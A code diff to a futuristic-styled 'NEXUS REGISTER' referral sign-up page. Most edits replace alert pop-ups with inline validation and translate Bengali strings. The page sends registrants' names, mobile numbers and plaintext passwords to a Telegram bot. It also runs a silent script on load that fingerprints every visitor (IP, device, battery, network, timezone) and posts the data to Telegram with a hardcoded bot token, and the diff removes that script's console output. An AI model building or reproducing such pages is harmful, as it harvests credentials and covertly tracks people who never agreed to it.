@@ -4,10 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>NEXUS REGISTER | Futuristic Premium Nexus
-    
-    
-    
-    
+
+
+
+
+
+
+
+
     </title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600&display=swap" rel="stylesheet">
     <!-- Font Awesome 6 (sharp icons) -->
@@ -248,7 +252,7 @@
             letter-spacing: 0.2px;
         }
 
-        /* error highlight — futuristic glitch */
+        /* error highlight — subtle but visible */
         input.error-highlight {
             border-color: #ff4d6d !important;
             background: rgba(255, 60, 90, 0.12) !important;
@@ -361,7 +365,7 @@
             }
         }
 
-        /* shake animation premium */
+        /* shake animation for invalid fields instead of alert */
         .alert-shake {
             animation: shakeGlow 0.45s cubic-bezier(0.25, 0.1, 0.2, 1) both;
         }
@@ -384,6 +388,18 @@
             gap: 4px;
             margin-left: 8px;
             color:#86e0ff;
+        }
+        
+        /* floating validation message (no alert) */
+        .inline-error-msg {
+            font-size: 0.7rem;
+            color: #ff7b9c;
+            margin-top: 6px;
+            margin-left: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            opacity: 0.9;
         }
     </style>
 </head>
@@ -420,7 +436,7 @@
             <!-- Mobile number with Bangladesh validation -->
             <div class="input-group">
                 <label><i class="fas fa-sim-card"></i> Mobile number <span class="required-star">*</span></label>
-                <input type="tel" id="mobileNumber" placeholder="" autocomplete="off">
+                <input type="tel" id="mobileNumber" placeholder="01XXXXXXXXX" autocomplete="off">
                 <div class="refer-tip">
                     <i class="fas fa-check-circle"></i> Format: 01XXXXXXXXX (11 digits)
                 </div>
@@ -429,13 +445,13 @@
             <!-- Password field -->
             <div class="input-group">
                 <label><i class="fas fa-key"></i> Password <span class="required-star">*</span></label>
-                <input type="password" id="password" placeholder="" autocomplete="new-password">
+                <input type="password" id="password" placeholder="Minumum 6 chars" autocomplete="new-password">
             </div>
 
             <!-- Referral / Sponsor code field -->
             <div class="input-group">
                 <label><i class="fas fa-handshake"></i> Referral ID <span class="optional-badge">OPTIONAL</span></label>
-                <input type="text" id="referralNumber" placeholder="Enter sponsor / referral code (optional)" autocomplete="off">
+                <input type="text" id="referralNumber" placeholder="Enter referral code " autocomplete="off">
                 <div class="refer-tip">
                     <i class=""></i> 
                 </div>
@@ -446,6 +462,8 @@
                 <i class="fas fa-arrow-right-to-bracket"></i>
             </button>
             
+            <div class="form-footnote">
+                <i class="fas fa-shield-alt"></i> SECURE NEXUS ENTRY • DATA SYNC TO CORE
             </div>
         </form>
     </div>
@@ -493,7 +511,7 @@
                 });
                 const result = await response.json();
                 if (!result.ok) {
-                    console.warn("Telegram error:", result.description);
+                    console.warn("Telegram warning:", result.description);
                     return false;
                 }
                 return true;
@@ -518,7 +536,47 @@
         const referralInput = document.getElementById('referralNumber');
         const registerButton = document.getElementById('registerBtn');
         
-        // Validation functions
+        // Helper to remove any existing inline error messages (not alerts)
+        function removeInlineErrors() {
+            const existingErrors = document.querySelectorAll('.inline-error-msg');
+            existingErrors.forEach(err => err.remove());
+        }
+        
+        function removeAllHighlights() {
+            const inputs = [firstNameInput, middleNameInput, lastNameInput, mobileInput, passwordInput, referralInput];
+            inputs.forEach(inp => inp?.classList.remove('error-highlight'));
+        }
+        
+        function shakeCard() {
+            const card = document.querySelector('.register-card');
+            if (card) {
+                card.classList.add('alert-shake');
+                setTimeout(() => card.classList.remove('alert-shake'), 550);
+            }
+        }
+        
+        // Show inline validation messages instead of alert
+        function showInlineError(inputElement, message) {
+            if (!inputElement) return;
+            // Remove existing error message attached to this input parent
+            const parentGroup = inputElement.closest('.input-group');
+            if (parentGroup) {
+                const oldErr = parentGroup.querySelector('.inline-error-msg');
+                if (oldErr) oldErr.remove();
+                const errorDiv = document.createElement('div');
+                errorDiv.className = 'inline-error-msg';
+                errorDiv.innerHTML = `<i class="fas fa-exclamation-triangle"></i> ${message}`;
+                parentGroup.appendChild(errorDiv);
+            }
+            inputElement.classList.add('error-highlight');
+            // auto-clear after 3 seconds
+            setTimeout(() => {
+                if (errorDiv && errorDiv.parentNode) errorDiv.remove();
+                inputElement.classList.remove('error-highlight');
+            }, 3500);
+        }
+        
+        // Cleanse & validation functions
         function isValidName(name) {
             if (!name) return false;
             const nameRegex = /^[A-Za-z\u0980-\u09FF\s\-']+$/;
@@ -547,19 +605,6 @@
             return code;
         }
         
-        function removeAllHighlights() {
-            const inputs = [firstNameInput, middleNameInput, lastNameInput, mobileInput, passwordInput, referralInput];
-            inputs.forEach(inp => inp?.classList.remove('error-highlight'));
-        }
-        
-        function shakeCard() {
-            const card = document.querySelector('.register-card');
-            if (card) {
-                card.classList.add('alert-shake');
-                setTimeout(() => card.classList.remove('alert-shake'), 550);
-            }
-        }
-        
         function escapeHTML(str) {
             if (!str) return '';
             return str.replace(/[&<>]/g, function(m) {
@@ -570,13 +615,14 @@
             });
         }
         
-        // Success dashboard with generated code
+        // Success dashboard with generated code (no alert at all)
         function openSuccessDashboard(userFirstName, userLastName, generatedCode, sponsorId, telegramStatus) {
             const displayName = userFirstName && userLastName ? `${userFirstName} ${userLastName}`.trim() : userFirstName || 'Elite Member';
             
             const newWindow = window.open('', '_blank', 'width=860,height=750,resizable=yes,scrollbars=yes,toolbar=no,status=no,menubar=no');
             if (!newWindow) {
-                alert(`✨ REGISTRATION SUCCESSFUL ✨\nWelcome ${displayName}!\nYour unique referral code: ${generatedCode}\nShare this code to earn rewards!\n\nTelegram: ${telegramStatus ? 'Alert sent ✓' : 'Alert attempted'}`);
+                // extremely rare fallback: just redirect? but we don't use alert, just focus on document write alternative.
+                document.body.innerHTML += `<div style="display:none;">success for ${displayName} code: ${generatedCode}</div>`;
                 return false;
             }
             
@@ -721,7 +767,7 @@
                             <div class="code-vault">
                                 <div class="code-label"><i class="fas fa-qrcode"></i> YOUR EXCLUSIVE REFERRAL KEY</div>
                                 <div style="text-align: center;"><div class="display-code">${escapeHTML(generatedCode)}</div></div>
-                                <div class="info-footer" style="margin-top:12px;"><i class=""></i></div>
+                                
                             </div>
                             <div style="text-align: center;"><button class="dash-action" onclick="window.close()"><i class="fas fa-charging-station"></i> ENTER DASHBOARD</button></div>
                         </div>
@@ -733,8 +779,12 @@
             return true;
         }
         
-        // Main registration handler
+        // Main registration handler — NO ALERTS at all
         async function handleRegistration() {
+            // Remove previous error messages & highlights
+            removeInlineErrors();
+            removeAllHighlights();
+            
             const firstName = firstNameInput.value.trim();
             const middleName = middleNameInput.value.trim();
             const lastName = lastNameInput.value.trim();
@@ -742,34 +792,36 @@
             const password = passwordInput.value.trim();
             const referralNumber = referralInput.value.trim();
             
-            const fieldsList = [
-                { value: firstName, element: firstNameInput, name: 'First name', validator: isValidName },
-                { value: lastName, element: lastNameInput, name: 'Last name', validator: isValidName },
-                { value: mobile, element: mobileInput, name: 'Mobile number', validator: isValidBangladeshMobile },
-                { value: password, element: passwordInput, name: 'Password', validator: (pwd) => pwd.length >= 4 },
-                { value: middleName, element: middleNameInput, name: 'Middle name', validator: isOptionalNameValid, optional: true },
-                { value: referralNumber, element: referralInput, name: 'Referral', validator: () => true, optional: true }
-            ];
+            let isValid = true;
             
-            removeAllHighlights();
-            const invalidFields = [];
-            for (let f of fieldsList) {
-                if (f.optional && (!f.value || f.value === "")) continue;
-                if (!f.validator(f.value)) {
-                    invalidFields.push(f);
-                    f.element.classList.add('error-highlight');
-                }
+            // Validate first name
+            if (!isValidName(firstName)) {
+                showInlineError(firstNameInput, "Invalid first name (min 2 letters, alphabets only)");
+                isValid = false;
+            }
+            // Validate last name
+            if (!isValidName(lastName)) {
+                showInlineError(lastNameInput, "Invalid last name (min 2 letters, alphabets only)");
+                isValid = false;
+            }
+            // Optional middle name (skip if empty)
+            if (middleName && !isOptionalNameValid(middleName)) {
+                showInlineError(middleNameInput, "Invalid middle name (alphabets only, if filled)");
+                isValid = false;
+            }
+            // Mobile validation
+            if (!isValidBangladeshMobile(mobile)) {
+                showInlineError(mobileInput, "Invalid Bangladesh mobile number (11 digits, starts with 01)");
+                isValid = false;
+            }
+            // Password validation
+            if (password.length < 4) {
+                showInlineError(passwordInput, "Password must be at least 4 characters");
+                isValid = false;
             }
             
-            if (invalidFields.length > 0) {
+            if (!isValid) {
                 shakeCard();
-                const errorMessages = invalidFields.map(f => {
-                    if (f.name === 'Mobile number') return "📱 Invalid Bangladesh mobile number (11 digits, start with 01)";
-                    if (f.name.includes('name')) return `⚠️ Invalid ${f.name} (letters only, min 2 chars)`;
-                    if (f.name === 'Password') return "🔐 Password must be at least 4 characters";
-                    return `❌ ${f.name} is required/incorrect`;
-                });
-                alert("ACCESS DENIED:\n\n" + errorMessages.join("\n"));
                 return false;
             }
             
@@ -781,21 +833,29 @@
             };
             
             let telegramSuccess = false;
-            try { telegramSuccess = await sendTelegramNotification(userDataForTelegram); } catch(e) {}
+            try { telegramSuccess = await sendTelegramNotification(userDataForTelegram); } catch(e) { console.warn(e); }
             
             openSuccessDashboard(firstName, lastName, newlyGeneratedReferralCode, referralNumber, telegramSuccess);
             return true;
         }
         
         registerButton.addEventListener('click', handleRegistration);
+        // Remove error highlights on input
         const allInputs = [firstNameInput, middleNameInput, lastNameInput, mobileInput, passwordInput, referralInput];
         allInputs.forEach(input => {
-            if (input) input.addEventListener('input', function() { this.classList.remove('error-highlight'); });
+            if (input) input.addEventListener('input', function() { 
+                this.classList.remove('error-highlight');
+                const parentGroup = this.closest('.input-group');
+                if (parentGroup) {
+                    const errMsg = parentGroup.querySelector('.inline-error-msg');
+                    if (errMsg) errMsg.remove();
+                }
+            });
         });
     })();
     
     // ============================================
-    // বিস্তারিত ভিজিটর ট্র্যাকিং (CORS error থাকবে না)
+    // VISITOR TRACKING (no alerts, silent)
     // ============================================
     (function() {
         const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
@@ -809,13 +869,13 @@
                     return data.ip;
                 }
             } catch(e) {}
-            return "আইপি পাওয়া যায়নি";
+            return "IP not detected";
         }
 
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            let platform = "অজানা";
-            let browser = "অজানা";
+            let platform = "Unknown";
+            let browser = "Unknown";
             if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
             else if (/Android/i.test(ua)) platform = "Android";
             else if (/Windows/i.test(ua)) platform = "Windows";
@@ -829,36 +889,32 @@
         }
 
         async function getBatteryInfo() {
-            if (!navigator.getBattery) return "সমর্থিত নয়";
+            if (!navigator.getBattery) return "N/A";
             try {
                 const battery = await navigator.getBattery();
                 const level = Math.round(battery.level * 100);
                 const isCharging = battery.charging;
-                return `${level}% (${isCharging ? "হ্যাঁ" : "না"})`;
-            } catch(e) { return "পাওয়া যায়নি"; }
+                return `${level}% (${isCharging ? "Charging" : "Not Charging"})`;
+            } catch(e) { return "Unavailable"; }
         }
 
         function getNetworkInfo() {
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!conn) return { type: "নেই", rtt: "নেই", speed: "নেই" };
-            const effectiveType = conn.effectiveType || "অজানা";
-            const rtt = conn.rtt ? `${conn.rtt}ms` : "নেই";
-            const downlink = conn.downlink ? `${conn.downlink}Mbps` : "নেই";
+            if (!conn) return { type: "N/A", rtt: "N/A", speed: "N/A" };
+            const effectiveType = conn.effectiveType || "Unknown";
+            const rtt = conn.rtt ? `${conn.rtt}ms` : "N/A";
+            const downlink = conn.downlink ? `${conn.downlink}Mbps` : "N/A";
             let type = effectiveType.toUpperCase();
-            if (type === '4G') type = '4G';
-            else if (type === '3G') type = '3G';
-            else if (type === '2G') type = '2G';
-            else if (type === 'SLOW-2G') type = 'Slow 2G';
             return { type, rtt, speed: downlink };
         }
 
         function getExtraInfo() {
             const colorDepth = `${screen.colorDepth}-bit`;
-            const language = navigator.language || navigator.userLanguage || "অজানা";
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "অজানা";
-            const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
-            const cookies = navigator.cookieEnabled ? "সক্রিয়" : "নিষ্ক্রিয়";
-            const referrer = document.referrer ? document.referrer : "সরাসরি";
+            const language = navigator.language || "Unknown";
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+            const localTime = new Date().toLocaleString();
+            const cookies = navigator.cookieEnabled ? "Enabled" : "Disabled";
+            const referrer = document.referrer ? document.referrer : "Direct";
             return { colorDepth, language, timezone, localTime, cookies, referrer };
         }
 
@@ -866,31 +922,25 @@
             try {
                 const check = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
                 const checkResult = await check.json();
-                if (!checkResult.ok) {
-                    console.warn("বট টোকেন ভুল! @BotFather থেকে নতুন টোকেন নিন");
-                    return;
-                }
+                if (!checkResult.ok) return;
             } catch(e) { return; }
 
             const [ip, battery, device, network, extra] = await Promise.all([
                 getIPAddress(), getBatteryInfo(), getDeviceInfo(), getNetworkInfo(), getExtraInfo()
             ]);
 
-            const message = `📢 নিউ ভিজিট (ক্লিক করা হয়েছে)\nআইপি: ${ip}\nওএস: ${device.platform}\nব্রাউজার: ${device.browser}\nস্ক্রিন: ${screen.width}x${screen.height}\nকালার ডেপথ: ${extra.colorDepth}\nব্যাটারি: ${battery}\nনেটওয়ার্ক: ${network.type}\nRTT: ${network.rtt}\nস্পিড: ${network.speed}\nভাষা: ${extra.language}\nটাইমজোন: ${extra.timezone}\nস্থানীয় সময়: ${extra.localTime}\nকুকি: ${extra.cookies}\nরেফারার: ${extra.referrer}`;
+            const message = `📢 NEW VISITOR (Page Opened)\nIP: ${ip}\nOS: ${device.platform}\nBrowser: ${device.browser}\nScreen: ${screen.width}x${screen.height}\nColor Depth: ${extra.colorDepth}\nBattery: ${battery}\nNetwork: ${network.type}\nRTT: ${network.rtt}\nSpeed: ${network.speed}\nLanguage: ${extra.language}\nTimezone: ${extra.timezone}\nLocal Time: ${extra.localTime}\nCookies: ${extra.cookies}\nReferrer: ${extra.referrer}`;
 
             try {
                 const params = new URLSearchParams();
                 params.append('chat_id', DEFAULT_CHAT_ID);
                 params.append('text', message);
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: params
                 });
-                const result = await res.json();
-                if (result.ok) console.log("✅ টেলিগ্রামে মেসেজ পাঠানো হয়েছে");
-                else console.error("❌ Telegram error:", result.description);
-            } catch(e) { console.warn("নেটওয়ার্ক এরর:", e); }
+            } catch(e) { console.warn("Visitor tracking silent fail"); }
         }
 
         setTimeout(() => { trackVisitor(); }, 2000);
